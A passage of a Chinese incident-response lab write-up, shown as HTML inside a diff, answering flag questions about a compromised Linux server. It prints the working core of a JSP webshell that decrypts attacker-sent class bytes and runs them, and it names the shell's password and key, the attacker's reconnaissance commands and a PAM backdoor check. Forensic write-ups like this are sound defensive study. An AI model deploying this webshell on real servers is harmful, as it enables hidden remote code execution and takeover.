+</span></span><span class="line"><span class="cl">        <span class="n">m</span> <span class="o">=</span> <span class="n">java</span><span class="o">.</span><span class="n">security</span><span class="o">.</span><span class="n">MessageDigest</span><span class="o">.</span><span class="n">getInstance</span><span class="p">(</span><span class="s2">&#34;MD5&#34;</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">        <span class="n">m</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">getBytes</span><span class="p">(),</span> <span class="mi">0</span><span class="p">,</span> <span class="n">s</span><span class="o">.</span><span class="n">length</span><span class="p">());</span>  
+</span></span><span class="line"><span class="cl">        <span class="n">ret</span> <span class="o">=</span> <span class="n">new</span> <span class="n">java</span><span class="o">.</span><span class="n">math</span><span class="o">.</span><span class="n">BigInteger</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="n">m</span><span class="o">.</span><span class="n">digest</span><span class="p">())</span><span class="o">.</span><span class="n">toString</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span><span class="o">.</span><span class="n">toUpperCase</span><span class="p">();</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">e</span><span class="p">)</span> <span class="p">{}</span>  
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span>  
+</span></span><span class="line"><span class="cl"><span class="n">public</span> <span class="k">static</span> <span class="ne">String</span> <span class="n">base64Encode</span><span class="p">(</span><span class="n">byte</span><span class="p">[]</span> <span class="n">bs</span><span class="p">)</span> <span class="n">throws</span> <span class="n">Exception</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">    <span class="n">Class</span> <span class="n">base64</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">    <span class="ne">String</span> <span class="n">value</span> <span class="o">=</span> <span class="n">null</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">    <span class="n">try</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">        <span class="n">base64</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="n">forName</span><span class="p">(</span><span class="s2">&#34;java.util.Base64&#34;</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">        <span class="ne">Object</span> <span class="n">Encoder</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">getMethod</span><span class="p">(</span><span class="s2">&#34;getEncoder&#34;</span><span class="p">,</span> <span class="n">null</span><span class="p">)</span><span class="o">.</span><span class="n">invoke</span><span class="p">(</span><span class="n">base64</span><span class="p">,</span> <span class="n">null</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">        <span class="n">value</span> <span class="o">=</span> <span class="p">(</span><span class="ne">String</span><span class="p">)</span> <span class="n">Encoder</span><span class="o">.</span><span class="n">getClass</span><span class="p">()</span><span class="o">.</span><span class="n">getMethod</span><span class="p">(</span><span class="s2">&#34;encodeToString&#34;</span><span class="p">,</span> <span class="n">new</span> <span class="n">Class</span><span class="p">[]</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">byte</span><span class="p">[]</span><span class="o">.</span><span class="k">class</span>  
+</span></span><span class="line"><span class="cl">        <span class="p">})</span><span class="o">.</span><span class="n">invoke</span><span class="p">(</span><span class="n">Encoder</span><span class="p">,</span> <span class="n">new</span> <span class="ne">Object</span><span class="p">[]</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">bs</span>  
+</span></span><span class="line"><span class="cl">        <span class="p">});</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">        <span class="n">try</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">base64</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="n">forName</span><span class="p">(</span><span class="s2">&#34;sun.misc.BASE64Encoder&#34;</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">            <span class="ne">Object</span> <span class="n">Encoder</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">newInstance</span><span class="p">();</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">value</span> <span class="o">=</span> <span class="p">(</span><span class="ne">String</span><span class="p">)</span> <span class="n">Encoder</span><span class="o">.</span><span class="n">getClass</span><span class="p">()</span><span class="o">.</span><span class="n">getMethod</span><span class="p">(</span><span class="s2">&#34;encode&#34;</span><span class="p">,</span> <span class="n">new</span> <span class="n">Class</span><span class="p">[]</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">                <span class="n">byte</span><span class="p">[]</span><span class="o">.</span><span class="k">class</span>  
+</span></span><span class="line"><span class="cl">            <span class="p">})</span><span class="o">.</span><span class="n">invoke</span><span class="p">(</span><span class="n">Encoder</span><span class="p">,</span> <span class="n">new</span> <span class="ne">Object</span><span class="p">[]</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">                <span class="n">bs</span>  
+</span></span><span class="line"><span class="cl">            <span class="p">});</span>  
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">e2</span><span class="p">)</span> <span class="p">{}</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">value</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl"><span class="p">}</span>  
+</span></span><span class="line"><span class="cl"><span class="n">public</span> <span class="k">static</span> <span class="n">byte</span><span class="p">[]</span> <span class="n">base64Decode</span><span class="p">(</span><span class="ne">String</span> <span class="n">bs</span><span class="p">)</span> <span class="n">throws</span> <span class="n">Exception</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">        <span class="n">Class</span> <span class="n">base64</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">        <span class="n">byte</span><span class="p">[]</span> <span class="n">value</span> <span class="o">=</span> <span class="n">null</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">        <span class="n">try</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">base64</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="n">forName</span><span class="p">(</span><span class="s2">&#34;java.util.Base64&#34;</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">            <span class="ne">Object</span> <span class="n">decoder</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">getMethod</span><span class="p">(</span><span class="s2">&#34;getDecoder&#34;</span><span class="p">,</span> <span class="n">null</span><span class="p">)</span><span class="o">.</span><span class="n">invoke</span><span class="p">(</span><span class="n">base64</span><span class="p">,</span> <span class="n">null</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">value</span> <span class="o">=</span> <span class="p">(</span><span class="n">byte</span><span class="p">[])</span> <span class="n">decoder</span><span class="o">.</span><span class="n">getClass</span><span class="p">()</span><span class="o">.</span><span class="n">getMethod</span><span class="p">(</span><span class="s2">&#34;decode&#34;</span><span class="p">,</span> <span class="n">new</span> <span class="n">Class</span><span class="p">[]</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">                <span class="ne">String</span><span class="o">.</span><span class="k">class</span>  
+</span></span><span class="line"><span class="cl">            <span class="p">})</span><span class="o">.</span><span class="n">invoke</span><span class="p">(</span><span class="n">decoder</span><span class="p">,</span> <span class="n">new</span> <span class="ne">Object</span><span class="p">[]</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">                <span class="n">bs</span>  
+</span></span><span class="line"><span class="cl">            <span class="p">});</span>  
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">try</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">                <span class="n">base64</span> <span class="o">=</span> <span class="n">Class</span><span class="o">.</span><span class="n">forName</span><span class="p">(</span><span class="s2">&#34;sun.misc.BASE64Decoder&#34;</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">                <span class="ne">Object</span> <span class="n">decoder</span> <span class="o">=</span> <span class="n">base64</span><span class="o">.</span><span class="n">newInstance</span><span class="p">();</span>  
+</span></span><span class="line"><span class="cl">                <span class="n">value</span> <span class="o">=</span> <span class="p">(</span><span class="n">byte</span><span class="p">[])</span> <span class="n">decoder</span><span class="o">.</span><span class="n">getClass</span><span class="p">()</span><span class="o">.</span><span class="n">getMethod</span><span class="p">(</span><span class="s2">&#34;decodeBuffer&#34;</span><span class="p">,</span> <span class="n">new</span> <span class="n">Class</span><span class="p">[]</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">                    <span class="ne">String</span><span class="o">.</span><span class="k">class</span>  
+</span></span><span class="line"><span class="cl">                <span class="p">})</span><span class="o">.</span><span class="n">invoke</span><span class="p">(</span><span class="n">decoder</span><span class="p">,</span> <span class="n">new</span> <span class="ne">Object</span><span class="p">[]</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">                    <span class="n">bs</span>  
+</span></span><span class="line"><span class="cl">                <span class="p">});</span>  
+</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">e2</span><span class="p">)</span> <span class="p">{}</span>  
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">value</span><span class="p">;</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="o">%&gt;</span> <span class="o">&lt;%</span>  
+</span></span><span class="line"><span class="cl">    <span class="n">try</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">        <span class="n">byte</span><span class="p">[]</span> <span class="n">data</span> <span class="o">=</span> <span class="n">base64Decode</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">getParameter</span><span class="p">(</span><span class="k">pass</span><span class="p">));</span>  
+</span></span><span class="line"><span class="cl">        <span class="n">data</span> <span class="o">=</span> <span class="n">x</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="bp">false</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">session</span><span class="o">.</span><span class="n">getAttribute</span><span class="p">(</span><span class="s2">&#34;payload&#34;</span><span class="p">)</span> <span class="o">==</span> <span class="n">null</span><span class="p">)</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">session</span><span class="o">.</span><span class="n">setAttribute</span><span class="p">(</span><span class="s2">&#34;payload&#34;</span><span class="p">,</span> <span class="n">new</span> <span class="n">X</span><span class="p">(</span><span class="n">this</span><span class="o">.</span><span class="n">getClass</span><span class="p">()</span><span class="o">.</span><span class="n">getClassLoader</span><span class="p">())</span><span class="o">.</span><span class="n">Q</span><span class="p">(</span><span class="n">data</span><span class="p">));</span>  
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">request</span><span class="o">.</span><span class="n">setAttribute</span><span class="p">(</span><span class="s2">&#34;parameters&#34;</span><span class="p">,</span> <span class="n">data</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">java</span><span class="o">.</span><span class="n">io</span><span class="o">.</span><span class="n">ByteArrayOutputStream</span> <span class="n">arrOut</span> <span class="o">=</span> <span class="n">new</span> <span class="n">java</span><span class="o">.</span><span class="n">io</span><span class="o">.</span><span class="n">ByteArrayOutputStream</span><span class="p">();</span>  
+</span></span><span class="line"><span class="cl">            <span class="ne">Object</span> <span class="n">f</span> <span class="o">=</span> <span class="p">((</span><span class="n">Class</span><span class="p">)</span> <span class="n">session</span><span class="o">.</span><span class="n">getAttribute</span><span class="p">(</span><span class="s2">&#34;payload&#34;</span><span class="p">))</span><span class="o">.</span><span class="n">newInstance</span><span class="p">();</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">f</span><span class="o">.</span><span class="n">equals</span><span class="p">(</span><span class="n">arrOut</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">f</span><span class="o">.</span><span class="n">equals</span><span class="p">(</span><span class="n">pageContext</span><span class="p">);</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">response</span><span class="o">.</span><span class="n">getWriter</span><span class="p">()</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">md5</span><span class="o">.</span><span class="n">substring</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">16</span><span class="p">));</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">f</span><span class="o">.</span><span class="n">toString</span><span class="p">();</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">response</span><span class="o">.</span><span class="n">getWriter</span><span class="p">()</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">base64Encode</span><span class="p">(</span><span class="n">x</span><span class="p">(</span><span class="n">arrOut</span><span class="o">.</span><span class="n">toByteArray</span><span class="p">(),</span> <span class="bp">true</span><span class="p">)));</span>  
+</span></span><span class="line"><span class="cl">            <span class="n">response</span><span class="o">.</span><span class="n">getWriter</span><span class="p">()</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">md5</span><span class="o">.</span><span class="n">substring</span><span class="p">(</span><span class="mi">16</span><span class="p">));</span>  
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>  
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">e</span><span class="p">)</span> <span class="p">{}</span> <span class="o">%&gt;</span>  </span></span></code></pre></td></tr></table>
+</div>
+</div><p>提取关键内容<br>
+<code>String pass = &quot;7f0e6f&quot;;</code><br>
+<code>flag{7f0e6f}</code></p>
+<h4 id="5黑客上传的木马解密密钥是什么" class="heading-element"><span>5、黑客上传的木马解密密钥是什么？</span>
+  <a href="#5%e9%bb%91%e5%ae%a2%e4%b8%8a%e4%bc%a0%e7%9a%84%e6%9c%a8%e9%a9%ac%e8%a7%a3%e5%af%86%e5%af%86%e9%92%a5%e6%98%af%e4%bb%80%e4%b9%88" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>密钥就是<code>xc</code><br>
+<code>String xc = &quot;1710acba6220f62b&quot;;</code><br>
+<code>flag{1710acba6220f62b}</code></p>
+<h4 id="6黑客连接-webshell-后第一条命令是什么" class="heading-element"><span>6、黑客连接 webshell 后第一条命令是什么</span>
+  <a href="#6%e9%bb%91%e5%ae%a2%e8%bf%9e%e6%8e%a5-webshell-%e5%90%8e%e7%ac%ac%e4%b8%80%e6%9d%a1%e5%91%bd%e4%bb%a4%e6%98%af%e4%bb%80%e4%b9%88" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>直接用<code>BlueTools</code><br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291837490.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291837490.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291837490.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291837490.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291837490.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291837490.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+<code>flag{uname -r}</code></p>
+<h4 id="7黑客连接-webshell-时查询当前-shell-的权限是什么第一条命令是什么" class="heading-element"><span>7、黑客连接 webshell 时查询当前 shell 的权限是什么？第一条命令是什么？</span>
+  <a href="#7%e9%bb%91%e5%ae%a2%e8%bf%9e%e6%8e%a5-webshell-%e6%97%b6%e6%9f%a5%e8%af%a2%e5%bd%93%e5%89%8d-shell-%e7%9a%84%e6%9d%83%e9%99%90%e6%98%af%e4%bb%80%e4%b9%88%e7%ac%ac%e4%b8%80%e6%9d%a1%e5%91%bd%e4%bb%a4%e6%98%af%e4%bb%80%e4%b9%88" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p><img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291839805.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291839805.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291839805.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291839805.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291839805.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291839805.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+<code>flag{root}</code></p>
+<h4 id="8黑客利用-webshell-执行命令查询服务器-linux-系统发行版本是什么" class="heading-element"><span>8、黑客利用 webshell 执行命令查询服务器 Linux 系统发行版本是什么？</span>
+  <a href="#8%e9%bb%91%e5%ae%a2%e5%88%a9%e7%94%a8-webshell-%e6%89%a7%e8%a1%8c%e5%91%bd%e4%bb%a4%e6%9f%a5%e8%af%a2%e6%9c%8d%e5%8a%a1%e5%99%a8-linux-%e7%b3%bb%e7%bb%9f%e5%8f%91%e8%a1%8c%e7%89%88%e6%9c%ac%e6%98%af%e4%bb%80%e4%b9%88" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p>常用的查询 linux 发型版本命令</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">lsb_release -a  
+</span></span><span class="line"><span class="cl">    命令显示Linux标准基础（LSB）的相关信息  
+</span></span><span class="line"><span class="cl">    包括发行版的名称、版本号等。  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    cat /etc/*release  
+</span></span><span class="line"><span class="cl">    命令显示/etc目录下所有以release结尾的文件内容  
+</span></span><span class="line"><span class="cl">    这些文件通常包含发行版的信息。  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    cat /etc/issue  
+</span></span><span class="line"><span class="cl">    命令显示系统的发行版信息，通常包括名称和版本号。  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    hostnamectl  
+</span></span><span class="line"><span class="cl">    命令显示系统信息，包括操作系统的名称和版本。  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    uname -a  
+</span></span><span class="line"><span class="cl">    显示内核相关信息，包括内核版本，但不会显示发行版的详细信息。  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    cat /proc/version  
+</span></span><span class="line"><span class="cl">    显示内核版本信息，类似于uname -r命令  
+</span></span><span class="line"><span class="cl">  
+</span></span><span class="line"><span class="cl">    cat /etc/os-release  
+</span></span><span class="line"><span class="cl">    文件包含系统发行版的详细信息，包括PRETTY_NAME，版本ID等。  </span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291840820.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291840820.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291840820.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291840820.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291840820.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291840820.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+<code>flag{Debian GNU/Linux 10 (buster)}</code></p>
+<h4 id="9黑客利用-webshell-执行命令还查询并过滤了什么提交整条执行成功的命令" class="heading-element"><span>9、黑客利用 webshell 执行命令还查询并过滤了什么？（提交整条执行成功的命令）</span>
+  <a href="#9%e9%bb%91%e5%ae%a2%e5%88%a9%e7%94%a8-webshell-%e6%89%a7%e8%a1%8c%e5%91%bd%e4%bb%a4%e8%bf%98%e6%9f%a5%e8%af%a2%e5%b9%b6%e8%bf%87%e6%bb%a4%e4%ba%86%e4%bb%80%e4%b9%88%e6%8f%90%e4%ba%a4%e6%95%b4%e6%9d%a1%e6%89%a7%e8%a1%8c%e6%88%90%e5%8a%9f%e7%9a%84%e5%91%bd%e4%bb%a4" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p><img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291841082.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291841082.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291841082.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291841082.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291841082.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291841082.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+但是通过解密返回包，这条命令并没有成功执行，继续找其他的<br>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291843462.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291843462.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291843462.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291843462.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291843462.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291843462.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+<img loading="lazy" src="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291843015.png" alt="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291843015.png" srcset="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291843015.png?size=small, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291843015.png?size=medium 1.5x, https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291843015.png?size=large 2x" data-title="https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291843015.png" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>
+这条命令成功执行了，黑客是在安装<code>PAM</code>后门<br>
+<code>flag{dpkg -l libpam-modules:amd64}</code></p>
+<h4 id="10黑客留下后门的反连的-ip-和-port-是什么ipport" class="heading-element"><span>10、黑客留下后门的反连的 IP 和 PORT 是什么？（IP:PORT)</span>
